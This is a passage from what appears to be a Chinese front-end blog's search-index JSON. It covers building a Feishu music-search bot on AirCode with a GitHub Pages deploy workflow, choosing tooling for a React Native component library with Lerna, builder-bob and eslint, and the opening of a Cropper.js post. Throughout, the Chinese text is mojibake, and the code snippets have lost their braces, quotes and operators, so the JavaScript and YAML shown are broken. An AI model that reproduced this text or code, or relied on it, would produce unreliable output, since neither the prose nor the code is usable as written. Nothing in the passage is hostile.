‡å¹¶ä¸æ˜¯ä¸€ä»¶å¤šä¹ˆéº»çƒ¦çš„äº‹æƒ…ï¼Œå€ŸåŠ©ä¸€äº›å·¥å…·ï¼Œç”šè‡³èƒ½åšåˆ°å¼€å‘ä½“éªŒä¸æ»‘åˆ°é£èµ·ã€‚æœ‰æ—¶ä¸å¾—ä¸æ„Ÿå¹ä¸€å¥å‰ç«¯å‘å±•å¤ªå¿«äº†ï¼Œæ—©å·²è„±ç¦»äº†åˆ€è€•ç«ç§çš„æ—¶ä»£ï¼Œå„ç§å…ˆè¿›çš„å·¥å…·ä¸æ–­æ¶Œç°ï¼Œç›®ä¸æš‡æ¥ï¼Œç°åœ¨æœ€å¤§çš„é—®é¢˜åè€Œæ˜¯å·¥å…·å¤ªå¤šï¼Œå­¦ä¸è¿‡æ¥çš„é—®é¢˜ï¼"},{"title":"ä½¿ç”¨ AirCode å¼€å‘é£ä¹¦æœºå™¨äºº","path":"/2023/02/14/7a3b3abbe76f/","content":"tags: React AirCode categories: tools åœ¨çº¿æ–‡æ¡£ï¼šhttps://docs-cn.aircode.io/ AirCode æ˜¯ä¸€ä¸ªåœ¨çº¿å¼€å‘å’Œéƒ¨ç½² Node.js åº”ç”¨çš„å¹³å°ï¼Œä¸ºå…¨æ ˆå·¥ç¨‹å¸ˆé‡èº«å®šåˆ¶ï¼Œç›®æ ‡æ˜¯è®©å¼€å‘å˜å¾—ç®€å•ã€‚ å¹¶ä¸”æä¾›ä¸€ä¸ªç®€æ˜“çš„ WebIDE å’Œå¼€ç®±å³ç”¨çš„äº‘æœåŠ¡ï¼Œè®©å¼€å‘è€…æ— éœ€å†æ“å¿ƒåç«¯é€‰å‹ã€ç¯å¢ƒæ­å»ºå’Œçº¿ä¸Šè¿ç»´ç­‰ä¸€ç³»åˆ—ç¹çä¹‹äº‹ï¼Œåªéœ€æ‰“å¼€æµè§ˆå™¨å³å¯å®Œæˆäº§å“å¼€å‘ï¼Œå¹¶éƒ¨ç½²åˆ°å…¨çƒèŠ‚ç‚¹ã€‚ ä½†æ˜¯ AirCode æœ‰èµ„æºé™åˆ¶ï¼Œä¸å»ºè®®ç”¨äºé«˜é¢‘çš„æœåŠ¡ï¼Œä½†æ˜¯æˆ‘ä»¬è¦å¼€å‘çš„æœºå™¨äººæ¥å£è°ƒç”¨é¢‘ç‡ä¸ä¼šç‰¹åˆ«é«˜ï¼Œå› æ­¤æ­£é€‚åˆ AirCodeã€‚ æ•ˆæœ @æœºå™¨äºº å‘Šè¯‰å®ƒä½ æƒ³å¬çš„æ­Œæ›²åå­—ï¼Œæœºå™¨äººä¼šè¿”å›ç»™ä½ æœ€åŒ¹é…çš„ä¸‰æ¡ï¼Œç‚¹å‡»ã€Œæ‰“å¼€æ’­æ”¾å™¨ã€ï¼Œä¼šåœ¨å³ä¾§å¼¹å‡ºåœ¨çº¿æ’­æ”¾å™¨ã€‚ éŸ³ä¹æ’­æ”¾å™¨æ’­æ”¾å™¨ä½¿ç”¨ Github ä¸Šçš„å¼€æºé¡¹ç›®ã€Œmusic-motion-xã€ï¼Œè¯¥é¡¹ç›®æ˜¯ SSR æœåŠ¡ç«¯æ¸²æŸ“é¡¹ç›®ï¼Œä½†æ˜¯æˆ‘ä»¬éœ€è¦éƒ¨ç½²åˆ° Github Pages ä¸Šï¼Œå› æ­¤éœ€è¦ä¸€äº›æ”¹é€ ã€‚ ä½¿ç”¨ Vite æ–°å»ºä¸ª react + ts çš„æ¨¡æ¿ï¼š yarn create vite my-vue-app --template react-ts æ¥ä¸‹æ¥å®‰è£…å¹¶é…ç½® eslintã€commitlintã€huskyå’Œlint-stagedç­‰å·¥å…·ï¼Œé…ç½®ç»†èŠ‚æœ¬æ–‡å°±ä¸èµ˜è¿°äº†ï¼Œè¯¦ç»†é…ç½®è§ https://github.com/bijinfeng/music-motion-x è¿ç§»ä»£ç è‡³æ–°é¡¹ç›®ä¸­ æ·»åŠ  Github Action name: Build and Deployon: push: branches: - masterjobs: build-and-deploy: runs-on: ubuntu-latest steps: - name: Checkout uses: actions/checkout@master with: submodules: true - name: Install Dependencies run: yarn install - name: Generate run: yarn build - name: Deploy uses: peaceiris/actions-gh-pages@v3 with: github_token: $ secrets.GITHUB_TOKEN publish_dir: ./dist æäº¤ä»£ç è‡³ Github å°±å¯ä»¥è§¦å‘è‡ªåŠ¨éƒ¨ç½²äº† æ–°å»ºé£ä¹¦åº”ç”¨åœ¨é£ä¹¦å¼€æ”¾å¹³å°æ–°å»ºä¸ªåº”ç”¨ï¼Œå›¾æ ‡å’Œåç§°è‡ªå®šä¹‰ï¼Œæ·»åŠ åº”ç”¨åæ·»åŠ ã€Œç½‘é¡µã€å’Œã€Œæœºå™¨äººã€åº”ç”¨ï¼š ç½‘é¡µåº”ç”¨å°†ä¸»é¡µåœ°å€é…ç½®æˆ Github Page çš„åœ°å€ æœºå™¨äººåº”ç”¨éœ€è¦é…ç½®ä¸ªæ¶ˆæ¯è¯·æ±‚åœ°å€ï¼Œå¯ä»¥å…ˆä¸å¡«ï¼Œç­‰åˆ° AirCode å¼€å‘å®Œæˆåå›å¤´å†æ¥å¡«ã€‚ æ¥ä¸‹æ¥æˆ‘ä»¬è¿˜éœ€è¦ç”³è¯·æƒé™å’Œè®¢é˜…äº‹ä»¶ï¼Œç”¨äºæœºå™¨äººæ¶ˆæ¯çš„æ”¶å‘ï¼š è®¢é˜…äº‹ä»¶ï¼šåªéœ€è¦ã€Œæ¥æ”¶æ¶ˆæ¯ã€çš„äº‹ä»¶å°±è¡Œï¼Œè¯·æ±‚åœ°å€é…ç½®æˆä¸Šé¢ ğŸ‘† æœºå™¨äººè¯·æ±‚åœ°å€ ç”³è¯·æƒé™ï¼šä»¥ä¸‹æƒé™æ˜¯å¿…é¡»è¦æœ‰çš„ï¼Œå…¶å®ƒæƒé™æŒ‰éœ€ç”³è¯· æœºå™¨äºº webhook æ¥å£å¼€å‘ä¸Šé¢åº”ç”¨å’Œæœºå™¨äººé…ç½®å¥½åï¼Œæ¥ä¸‹æ¥å°±éœ€è¦å¼€å‘ webhook æ¥å£ä¾›æœºå™¨äººè®¢é˜…ã€‚ é¦–å…ˆéœ€è¦æ–°å»ºä¸ªåº”ç”¨ï¼Œç„¶åå®‰è£…ä¸¤ä¸ªä¾èµ–ï¼š axios - å‘é€ http è¯·æ±‚ @larksuiteoapinode-sdk - é£ä¹¦å¼€æ”¾æ¥å£ SDK æ–°å»º client.js æ–‡ä»¶ const lark = require(@larksuiteoapi/node-sdk);module.exports = new lark.Client( appId: process.env.app_id, appSecret: process.env.app_secret, appType: lark.AppType.SelfBuild,); app_id å’Œ app_secretè¿™ä¸¤ä¸ªç¯å¢ƒå˜é‡ä»é£ä¹¦å¼€æ”¾å¹³å°è·å–åï¼Œé…ç½®åˆ° AirCode çš„ Enviroments Tab ä¸‹ï¼š æ–°å»º image.js æ–‡ä»¶ é£ä¹¦çš„æ¶ˆæ¯å¡ç‰‡è¦æ’å…¥å›¾ç‰‡ï¼Œå¿…é¡»è¦å…ˆå°†å›¾ç‰‡ä¸Šä¼ åˆ°é£ä¹¦ä¸­æ‰è¡Œï¼Œå› æ­¤è¯¥æ–‡ä»¶çš„ä½œç”¨æ˜¯å°†ç½‘ç»œå›¾ç‰‡ä¸Šä¼ åˆ°é£ä¹¦ä¸­ï¼Œå¹¶è¿”å›å›¾ç‰‡çš„ image_keyã€‚ const aircode = require(aircode);const axios = require(axios);const querystring = require(querystring);const client = require(./client);module.exports = async ( url ) = // å¦‚æœå·²ç»ä¸Šä¼ è¿‡äº†ï¼Œä»æ•°æ®åº“ä¸­å–å‡ºç¼“å­˜ const ImagesTable = aircode.db.table(images); // æŸ¥è¯¢æ•°æ®åº“ const result = await ImagesTable.where( url ).find(); if (result.length 0) return result[0].imageKey; // æ·»åŠ  param=200y200 çš„å‚æ•°ï¼Œä½¿ç”¨å°å°ºå¯¸å›¾ç‰‡ const splitUrl = url.split(?); const querys = querystring.parse(splitUrl[1] || ); const queryString = querystring.stringify( ...querys, param: 200y200 ); const newUrl = `$splitUrl[0]?$queryString`; // ä¸Šä¼ å›¾ç‰‡åˆ°é£ä¹¦ä¸­ const response = await axios.get(newUrl, responseType: arraybuffer ); const image_key = await client.im.image.create( data: image_type: message, image: Buffer.from(response.data, utf-8), , ); // ä¿å­˜åˆ°æ•°æ®åº“ä¸­ ImagesTable.save( url: newUrl, imageKey: image_key, ); return image_key;; æ–°å»º search.js æ–‡ä»¶ ä½¿ç”¨ç½‘æ˜“äº‘éŸ³ä¹çš„æœç´¢æ¥å£æ ¹æ®å…³é”®è¯æœç´¢éŸ³ä¹ï¼Œå¯ä»¥æ ¹æ®è¯¥æ–‡æ¡£è‡ªå»º APIï¼Œè¿™é‡Œä¸å¤šèµ˜è¿°äº†ã€‚ const axios = require(axios);const imageUpload = require(./image);const request = axios.create( baseURL: process.env.music_api,);// æœç´¢æ­Œæ›²module.exports = async function (params) const keyword = params; const result = await request.get(`/search?keywords=$keywordtype=1018`); // å–å‰ä¸‰é¦– const songs = result.data.result.song.songs.slice(0, 3); const _list = await songs.map((data) = const artistNames = data.ar.length ? [...data.ar] .reverse() .reduce((ac, a) = `$a.name $ac`, ) .trim() : ; return imgUrl: data.al.picUrl, title: `$data.name`, desc: `$artistNames Â· $data.al.name`, artistId: data.ar[0].id, albumId: data.al.id, artistName: artistNames, albumName: data.al.name, id: data.id, ; ); const imageKeys = await Promise.all( _list.map((data) = imageUpload( url: data.imgUrl )) ); const list = _list.map((data, index) = ( ...data, imageKey: imageKeys[index], )); return list;; æ–°å»º reaction.js æ–‡ä»¶ è¯¥æ–‡ä»¶å°±æ˜¯ç”¨æ¥ç”Ÿæˆæ¶ˆæ¯å¡ç‰‡å¯Œæ–‡æœ¬ï¼Œå¯Œæ–‡æœ¬ JSON å¯ä»¥å…ˆåœ¨é£ä¹¦çš„æ¶ˆæ¯å¡ç‰‡æ­å»ºå·¥å…·æ­å»ºå¥½ï¼Œå†å¤åˆ¶åˆ°è¯¥æ–‡ä»¶ä¸­ã€‚ // ç”Ÿæˆæ¶ˆæ¯å¡ç‰‡const generatePath = (id) = return `https://applink.feishu.cn/client/web_app/open?appId=$process.env.app_idmode=sidebarid=$id`;;const generateHeader = (keyword) = return template: turquoise, title: content: `ğŸµ $keyword`, tag: plain_text, , ;;const generateCard = (data) = return tag: div, text: tag: lark_md, content: `**$data.title** $data.desc [æ‰“å¼€æ’­æ”¾å™¨]($generatePath( data.id ))`, , extra: tag: img, img_key: data.imageKey, alt: tag: plain_text, content: data.title, , , ;;module.exports = ( keyword, list ) = console.log(search keyword: , keyword); console.log(search result: , list); const header = generateHeader(keyword); const elements = list.reduce((result, item, index) = const card = generateCard(item); if (index 0) result.push( tag: hr ); return [...result, card]; , []); return config: wide_screen_mode: true, , elements, header, ;; æ–°å»º index.js æ–‡ä»¶ æœ€åå†æ–°å»ºä¸ªå…¥å£æ–‡ä»¶ï¼Œé›†æˆä¸‹å‰é¢çš„å‡ ä¸ªæ¨¡å—ï¼š é¦–å…ˆé£ä¹¦å¼€æ”¾å¹³å°ä¼šå‘æ¥å£å‘é€ä¸ªéªŒè¯è¯·æ±‚ï¼Œè¯·æ±‚ä¸º JSON æ ¼å¼ï¼Œå¸¦ challenge å‚æ•°ã€‚åº”ç”¨æ¥æ”¶æ­¤è¯·æ±‚åï¼Œéœ€è§£æå‡º challenge å€¼ï¼Œå¹¶åœ¨ 1 ç§’å†…å›å¤ challenge å€¼ã€‚å¯ä»¥é€šè¿‡ params.type â€˜url_verificationâ€™ æ¥åˆ¤æ–­è¯·æ±‚æ˜¯å¦æ˜¯éªŒè¯è¯·æ±‚ã€‚ é€šè¿‡ register æ–¹æ³•æ³¨å†Œäº‹ä»¶çš„å›è°ƒï¼Œç›®å‰æˆ‘ä»¬åªè®¢é˜…äº† im.message.receive_v1è¿™ä¸€ä¸ªäº‹ä»¶ã€‚ // @see https://docs.aircode.io/guide/functions/const aircode = require(aircode);const lark = require(@larksuiteoapi/node-sdk);const client = require(./client);const search = require(./search);const reaction = require(./reaction);const sendMessage = (chatId, content, type = text) = return client.im.message.create( params: receive_id_type: chat_id, , data: receive_id: chatId, content: JSON.stringify(content), msg_type: type, , );;const eventDispatcher = new lark.EventDispatcher().register( im.message.receive_v1: async (data) = const open_chat_id = data.message.chat_id; const msg = JSON.parse(data.message.content).text; const keyword = msg.replace(/^@\\w+/, ).trim(); let res; if (!keyword) res = await sendMessage(open_chat_id, text: è¯·å‘Šè¯‰æˆ‘ä¸€äº›å…³é”®è¯ï¼Œæ¯”å¦‚æ­Œåï¼Œæ­Œæ‰‹åï¼Œæ­Œå•åï¼Œç”¨æˆ·åç­‰~, ); else const list = await search( keyword ); const interactive = reaction( keyword, list ); res = await sendMessage(open_chat_id, interactive, interactive); return res; ,);module.exports = async function (params, context) console.log(Received params:, params); // url éªŒè¯ if (params.type === url_verification) return challenge: params.challenge ; // æ ¹æ® message_id å»é‡å¤æ¶ˆæ¯ const message_id = params.event.message.message_id; const LogsTable = aircode.db.table(logs); const findResult = await LogsTable.where( message_id ).find(); if (findResult.length 0) return `é‡å¤æ¶ˆæ¯ - $message_id`; LogsTable.save( message_id ); return await eventDispatcher.invoke(params);; ç‚¹å‡» DeployæŒ‰é’®ï¼Œå‘å¸ƒæ‰€æœ‰å‡½æ•°ï¼Œå¤åˆ¶ index.js çš„å…¬ç½‘è¯·æ±‚è·¯å¾„åˆ°é£ä¹¦åº”ç”¨è®¾ç½®ä¸­ æ€»ç»“AirCode ç”¨æ¥å¼€å‘æœºå™¨äººç›¸å½“æ–¹é¢ï¼Œæ›¿æˆ‘ä»¬çœæ‰äº†æ•°æ®åº“ï¼Œæ–‡ä»¶æœåŠ¡ï¼Œçº¿ä¸Šè¿ç»´ç­‰ä¸€ç³»ç±»ç¹ççš„äº‹æƒ…ï¼Œä½¿ç”¨ä¸€ä¸ªæµè§ˆå™¨å°±èƒ½å¿«é€Ÿçš„å¼€å‘ä¸Šçº¿ã€‚å†æ­é…ä¸Š Github Page å°±èƒ½ç™½å«–åˆ°åº•ã€‚"},{"title":"React Native ç»„ä»¶åº“ - è„šæ‰‹æ¶","path":"/2023/02/06/8f5436bb4e35/","content":"tags: React React Native categories: React Native ç»„ä»¶åº“ ä½œä¸ºä¸€ä¸ªå‰ç«¯ erï¼Œè°ä¸æƒ³æ‹¥æœ‰ä¸€ä¸ªè‡ªå·±çš„ç»„ä»¶åº“ã€‚æˆ‘ä¹Ÿæƒ³ï¼Œæ‰€ä»¥å®ƒæ¥äº† - rn-vantï¼Œä½¿ç”¨ vant è®¾è®¡è§„èŒƒçš„ React Native ç»„ä»¶åº“ã€‚ ç»„ä»¶åº“ç›®å‰å·²ç»æ‹¥æœ‰äº† 40+ ç»„ä»¶ï¼ˆè™½ç„¶è¿˜æ˜¯å¾ˆç®€é™‹ï¼Œbug ä¹Ÿæ˜¯ä¸€å †ï¼Œä¸»è¦è¿˜æ˜¯æˆ‘å¤ªæ‡’äº† ğŸ˜…ï¼‰ï¼Œä¹Ÿç®—åœ†äº†æˆ‘çš„ä¸€ä¸ªæ¢¦æƒ³ï¼Œç°åœ¨æ˜¯æ—¶å€™åšä¸ªé˜¶æ®µæ€»ç»“äº†ï¼Œå°†è¿™æ®µæ—¶é—´å¼€å‘é‡åˆ°çš„é—®é¢˜éƒ½è®°å½•ä¸‹æ¥ï¼Œä¸€æ–¹é¢æ˜¯æ€•è‡ªå·±å¿˜äº†ï¼Œå¦ä¸€æ–¹é¢ä¹Ÿæ˜¯ç»™çœ‹åˆ°è¿™ç³»åˆ—æ–‡ä»¶çš„æœ‹å‹åšä¸ªå‚è€ƒã€‚ Mono or Multi Repo from https://juejin.cn/post/6949882490324516894#heading-9 è¿™é‡Œç®€å•è§£é‡Šä¸‹ä»€ä¹ˆæ˜¯ MonoRepo ä»¥åŠ MultiRepoï¼Œä»¥åŠä»–ä»¬çš„ä¼˜ç¼ºç‚¹ï¼š MonoRepoï¼šæŠŠå¤šä¸ªé¡¹ç›®æ”¾åœ¨ä¸€ä¸ªä»“åº“é‡Œé¢ç®¡ç†ã€‚ MultiRepoï¼šæ¯ä¸ªé¡¹ç›®éƒ½å¯¹åº”ç€ä¸€ä¸ªå•ç‹¬çš„ä»£ç ä»“åº“æ¯ä¸ªé¡¹ç›®è¿›è¡Œåˆ†æ•£ç®¡ç†ã€‚ MonoRepo ä¼˜ç¼ºç‚¹ï¼š ä¼˜ç‚¹ï¼š ç»Ÿä¸€äº†å·¥ä½œæµï¼šç”±äºæ‰€æœ‰çš„é¡¹ç›®æ”¾åœ¨ä¸€ä¸ªä»“åº“å½“ä¸­ï¼Œå¤ç”¨èµ·æ¥éå¸¸æ–¹ä¾¿ï¼Œå¦‚æœæœ‰ä¾èµ–çš„ä»£ç å˜åŠ¨ï¼Œé‚£ä¹ˆç”¨åˆ°è¿™ä¸ªä¾èµ–çš„é¡¹ç›®å½“ä¸­ä¼šç«‹é©¬æ„ŸçŸ¥åˆ° é™ä½åŸºå»ºæˆæœ¬ï¼šæ‰€æœ‰é¡¹ç›®å¤ç”¨ä¸€å¥—æ ‡å‡†çš„å·¥å…·å’Œè§„èŒƒï¼Œæ— éœ€åˆ‡æ¢å¼€å‘ç¯å¢ƒï¼Œå¦‚æœæœ‰æ–°çš„é¡¹ç›®æ¥å…¥ï¼Œä¹Ÿå¯ä»¥ç›´æ¥å¤ç”¨å·²æœ‰çš„åŸºå»ºæµç¨‹ï¼Œæ¯”å¦‚ CI æµç¨‹ã€æ„å»ºå’Œå‘å¸ƒæµç¨‹ã€‚ æå‡å›¢é˜Ÿåä½œæ•ˆç‡ï¼šä¸€æ–¹é¢å¤§å®¶éƒ½åœ¨ä¸€ä¸ªä»“åº“å¼€å‘ï¼Œèƒ½å¤Ÿæ–¹ä¾¿åœ°å…±äº«å’Œå¤ç”¨ä»£ç ï¼Œæ–¹ä¾¿æ£€ç´¢é¡¹ç›®æºç ï¼Œå¦ä¸€æ–¹é¢ï¼Œgit commit çš„å†å²è®°å½•ä¹Ÿæ”¯æŒä»¥åŠŸèƒ½ä¸ºå•ä½è¿›è¡Œæäº¤ï¼Œä¹‹å‰å¯¹äºæŸä¸ªåŠŸèƒ½çš„æäº¤ï¼Œéœ€è¦æ”¹å¥½å‡ ä¸ªä»“åº“ï¼Œæäº¤å¤šä¸ª commitï¼Œç°åœ¨åªéœ€è¦æäº¤ä¸€æ¬¡ï¼Œç®€åŒ–äº† commit è®°å½•ï¼Œæ–¹ä¾¿åä½œã€‚ ç¼ºç‚¹ï¼š ä½“ç§¯é—®é¢˜ï¼šå› ä¸ºæ‰€æœ‰ code éƒ½åœ¨ä¸€ä¸ª repo ä¸‹ï¼Œè¿™å°±å¯¼è‡´äº†éšç€é¡¹ç›®è¶Šæ¥è¶Šå¤æ‚ï¼Œæ•´ä¸ª repo çš„ä½“ç§¯ä¼šå˜å¾—å¾ˆå¤§ã€‚æ®è¯´æŸå¤§å…¬å¸å‘˜å·¥æƒ³è¦ä¿®æ”¹é¡¹ç›®ä¸­çš„æŸä¸ªå°æ ·å¼ï¼Œéœ€è¦å°†æ•°ä»¥å G çš„ repo æ‹‰åˆ°æœ¬åœ°ï¼Œå¬èµ·æ¥ç¡®å®æ˜¯ä¸ªå™©æ¢¦ã€‚ æƒé™é—®é¢˜ï¼šMonorepo æ¨¡å¼ä¸‹çš„æƒé™æ˜¯å¼€æ”¾çš„ã€‚ä»£ç å®‰å…¨ï¼Œæ–‡æ¡£å®‰å…¨ï¼Œéƒ½ä¼šæ˜¯ä¸€ä¸ªéœ€è¦å¥½å¥½è€ƒè™‘çš„é—®é¢˜ã€‚è¿™ä¸ªæ–¹é¢å¦‚æœå¤„ç†ä¸å¥½çš„è¯ï¼Œå¯¹æ•´ä¸ªå›¢é˜Ÿæ•´ä¸ªé¡¹ç›®å¸¦æ¥çš„åæœå¯èƒ½æ˜¯ç¾éš¾æ€§çš„ã€‚ ç‰ˆæœ¬æ§åˆ¶ï¼šä»“åº“å˜å¾—å¤ªå¤§ï¼Œå¯¹ç‰ˆæœ¬æ§åˆ¶æŠ€æœ¯ä¼šæœ‰å¾ˆå¤§çš„æŒ‘æˆ˜ã€‚å› ä¸º Git ç¤¾åŒºå»ºè®®çš„æ˜¯ä½¿ç”¨æ›´å¤šæ›´å°çš„ä»£ç åº“ï¼ŒGit æœ¬èº«å¹¶ä¸é€‚åˆå•ä¸ªå·¨å¤§çš„ä»£ç åº“ã€‚ Monorepo å’Œ Multirepo éƒ½æ˜¯ç®¡ç†ç»„ç»‡ä»£ç çš„æ–¹å¼ï¼Œå¹¶æ²¡æœ‰ä»€ä¹ˆä¼˜åŠ£ä¹‹åˆ†ï¼Œè¿˜æ˜¯é‚£å¥è¯â€œå­˜åœ¨å³åˆç†â€ï¼Œå·¥å…·éƒ½æ˜¯ç”¨æ¥æœåŠ¡ç”Ÿäº§çš„ï¼Œèƒ½æ›´æœ‰æ•ˆè§£å†³å½“ä¸‹é—®é¢˜çš„ï¼Œå°±æ˜¯æ›´å¥½çš„ã€‚å›åˆ°ç»„ä»¶åº“ä¸Šï¼ŒæŒ‰ç…§æœ€åˆçš„è§„åˆ’ï¼Œç»„ä»¶åº“æœ€å°‘ä¼šäº§å‡ºä¸¤ä¸ª npm åŒ…ï¼Œç»„ä»¶åº“æœ¬ä½“å’Œ icon ç»„ä»¶ï¼Œå¹¶ä¸”ç»„ä»¶åº“ä¼šä¾èµ– icon ç»„ä»¶ï¼Œè‡ªç„¶é‡‡ç”¨ Monorepo çš„æ–¹å¼æ˜¯æœ€å¥½çš„ã€‚ Monorepo å·¥å…·æ—¢ç„¶é€‰æ‹©äº† Monorepoï¼Œè‡ªç„¶å°±éœ€è¦çœ‹çœ‹ç¤¾åŒºé‡Œæœ‰å“ªäº›å¥½çš„ Monorepo å·¥å…·ï¼š Bitï¼šç”¨äºç»„ä»¶é©±åŠ¨å¼€å‘çš„å·¥å…·é“¾ Turborepoï¼šç”¨äº JavaScript å’Œ TypeScript ä»£ç åº“çš„é«˜æ€§èƒ½æ„å»ºç³»ç»Ÿã€‚ Rushï¼šä¸€ä¸ªå¯æ‰©å±•çš„ web å•ä»“åº“ç®¡ç†å™¨ã€‚ Nxï¼šå…·æœ‰ä¸€æµçš„ monorepo æ”¯æŒå’Œå¼ºå¤§é›†æˆçš„ä¸‹ä¸€ä»£æ„å»ºç³»ç»Ÿã€‚ Lernaï¼šç”¨äºç®¡ç†åŒ…å«å¤šä¸ªè½¯ä»¶åŒ…çš„é¡¹ç›® ä¸Šé¢è¿™äº›å·¥å…·ä¸­ï¼Œæˆ‘æœ€ç†Ÿæ‚‰çš„å°±æ˜¯ Lerna äº†ï¼Œç®€å•è€Œä¸ç®€é™‹ï¼Œå®Œå…¨èƒ½å¤Ÿèƒœä»»ç»„ä»¶åº“ç¼–æ’çš„å·¥ä½œï¼Œå› æ­¤é¦–é€‰ Lerna äº†ã€‚ï¼ˆæ€§èƒ½ç¡®å®ä¸å¦‚å…¶ä»–çš„å·¥å…·ï¼Œæ¯”å¦‚ Turborepoï¼Œä½†æ˜¯ç›®å‰ä¹Ÿå¹¶æ²¡æœ‰å¤ªå¤§çš„æ€§èƒ½è¯‰æ±‚ï¼Œä»¥åé‡åˆ°äº†ï¼Œå¯ä»¥åœ¨è¿ç§»ï¼‰ ç»„ä»¶åº“æ„å»ºå·¥å…·æˆ‘ä»¬çš„ç»„ä»¶åº“æœ€ç»ˆæ˜¯éœ€è¦å‘å¸ƒåˆ° npm ä¸Šçš„ï¼Œå› ä¸ºç»„ä»¶åº“çš„è¿è¡Œç¯å¢ƒä¸åœ¨æµè§ˆå™¨ä¸­ï¼Œå› æ­¤åªéœ€è¦æä¾› ES Moduleå’Œ CommonJSæ¨¡å—çš„ç»„ä»¶å³å¯ï¼Œå¦å¤–å¦‚æœæ˜¯ Typescript å·¥ç¨‹ï¼Œæ„å»ºæ—¶è¿˜éœ€è¦è¾“å‡ºç±»å‹æ–‡ä»¶ï¼Œåœ¨è°ƒç ”ç¤¾åŒºå¼€æºçš„ç»„ä»¶åº“ä¼šé”å®šä¸€ä¸ªå·¥å…· - react-native-builder-bob å®‰è£… react-native-builder-bob: yarn add react-native-builder-bob -D é…ç½®åŠä½¿ç”¨éƒ½å¾ˆç®€å•ï¼Œåœ¨ package.json ä¸­æ–°å¢å¦‚ä¸‹é…ç½®ï¼š scripts: build: bob build , react-native-builder-bob: source: src, output: lib, targets: [ commonjs, module, [ typescript, project: tsconfig.build.json ] ] è¿è¡Œ yarn buildåï¼Œä¼šåœ¨ lib ç›®å½•ä¸‹ç”Ÿæˆç›¸åº”æ¨¡å—çš„æ–‡ä»¶ï¼š æœ€ååœ¨ package.json ä¸­ï¼Œæ·»åŠ è¿™äº›æ¨¡å—çš„å…¥å£è¯´æ˜ï¼š main: lib/commonjs/index, module: lib/module/index, types: lib/typescript/index.d.ts, react-native: src/index, source: src/index ä»£ç è´¨é‡ and ä»£ç é£æ ¼ä»£ç è´¨é‡ç›®å‰åªé…ç½®äº† eslintï¼Œåé¢å¦‚æœæœ‰æ›´å¥½çš„å·¥å…·ï¼Œå¯ä»¥å°è¯•æ¥å…¥ã€‚ç°åœ¨ä½¿ç”¨çš„æ˜¯ https://github.com/youngjuning-archive/eslint-config è¿™ä¸ªï¼Œä¸»è¦çœ‹ä¸­å®ƒå°† prettier å’Œ eslint é›†æˆåˆ°ä¸€èµ·äº†ï¼Œçœäº†è‡ªå·±é…ç½®ï¼ˆprettier å’Œ eslint æœ‰äº›è§„åˆ™æ˜¯å†²çªçš„ï¼Œè§£å†³èµ·æ¥è¶…çº§éº»çƒ¦ï¼‰ï¼Œè€Œä¸” eslint çš„è§„åˆ™æ¥è‡ª airbnbï¼Œä»£ç è´¨é‡ä¹Ÿæœ‰äº†ä¿éšœã€‚ ä»£ç é£æ ¼ç”¨çš„æ˜¯ prettierï¼Œå› ä¸ºå·²ç»é›†æˆåˆ° @youngjuning/eslint-configäº†ï¼Œåªéœ€è¦å®‰è£… @youngjuning/prettier-configï¼Œå¹¶ç®€å•é…ç½®ä¸‹å°±èƒ½ä½¿ç”¨äº†ã€‚ // .prettierrc.jsmodule.exports = require(@youngjuning/prettier-config); é™¤äº† eslint å’Œ prettierï¼Œæˆ‘ä»¬è¿˜èƒ½å€ŸåŠ©ä¸€äº›å·¥å…·ï¼Œæ¥å¸®åŠ©æˆ‘ä»¬æ›´å¥½çš„ç»„ç»‡ä»£ç ï¼š huskyï¼šç®¡ç† git hook çš„å·¥å…·ï¼Œå¯ä»¥åœ¨ git commit æ—¶ï¼Œå¼ºåˆ¶æ ¡éªŒå’Œæ ¼å¼åŒ–ä»£ç ã€‚ lint-stagedï¼šé’ˆå¯¹ git æš‚å­˜æ–‡ä»¶æ‰§è¡Œä¸€äº›è„šæœ¬ï¼Œç»“åˆ husky å¯ä»¥å®ç°åªå¯¹æ”¹åŠ¨çš„æ–‡ä»¶ï¼Œæ ¡éªŒå’Œæ ¼å¼åŒ–ï¼Œæ¯•ç«Ÿæ”¹ä¸€è¡Œä»£ç å°±è¦æ ¡éªŒæ•´ä¸ªä»“åº“æˆæœ¬è¿˜æ˜¯å¤ªé«˜äº†ã€‚ commitlintï¼šgit commit messages é£æ ¼æ ¡éªŒå·¥å…·ã€‚ è‡³äºå¦‚ä½•åœ¨ lerna é¡¹ç›®ä¸­å¦‚ä½•é›†æˆè¿™äº›å·¥å…·ï¼Œå¯ä»¥çœ‹æˆ‘çš„å¦ä¸€ç¯‡åšå®¢ ã€lerna é¡¹ç›®ä¸­é›†æˆ huskyã€lint-stagedã€commitlint å’Œ cz-customizableã€‘ï¼Œé‡Œé¢åšäº†è¯¦ç»†çš„è¯´æ˜ã€‚ æ€»ç»“æœ¬æ–‡ä¸»è¦ä»‹ç»äº†å¼€å‘ä¸€ä¸ªç»„ä»¶åº“éœ€è¦çš„ä¸€äº›å·¥å…·çš„é€‰å‹ï¼Œå®é™…ä¸Šè¿™äº›å·¥å…·ç†Ÿæ‚‰å‰ç«¯å·¥ç¨‹åŒ–çš„åŒå­¦éƒ½ä¸ä¼šé™Œç”Ÿï¼Œå…·ä½“çš„é…ç½®å¯ä»¥å‚è€ƒæˆ‘çš„ç»„ä»¶åº“é¡¹ç›® - rn-vantã€‚åé¢æˆ‘ä¼šå†ä»‹ç»ä¸‹ç»„ä»¶æ–¹çš„æ–‡æ¡£åŠ CICD çš„ç›¸å…³é…ç½®ã€‚"},{"title":"Cropper.js å®è·µ","path":"/2023/02/02/1b69b3598f64/","content":"èƒŒæ™¯å‰æ®µæ—¶é—´æ¥äº†ä¸ªéœ€æ±‚ï¼Œéœ€è¦åšä¸ªå›¾ç‰‡ä¸Šä¼ ï¼Œé¢„è§ˆåŠè£åˆ‡æœåŠ¡ï¼Œè°ƒç ”äº†ä¸‹ç¤¾åŒºçš„å¼€æºæ–¹æ¡ˆï¼Œcropperjs è¿›å…¥è§†é‡ï¼Œç®€å•çœ‹äº†ä¸‹ READMEï¼Œå®Œç¾ç¬¦åˆæˆ‘çš„éœ€æ±‚ï¼Œæœ€ç»ˆå®ç°æ•ˆæœå¦‚ä¸‹ï¼š å®‰è£…æ²¡å•¥å¥½è¯´çš„ï¼Œç›´æ¥ yarn èµ°èµ·ï¼š yarn add cropperjs å¼•å…¥ CSS æ–‡ä»¶ï¼š import cropperjs/dist/cropper.css; å°è£…ç®€å•çš„åˆ†æä¸‹éœ€æ±‚ï¼Œæ•´ä¸ªå›¾ç‰‡è£åˆ‡åŒ…å«ä»¥ä¸‹å‡ ä¸ªéƒ¨ä»¶ï¼š å›¾ç‰‡è£åˆ‡æ¡† - 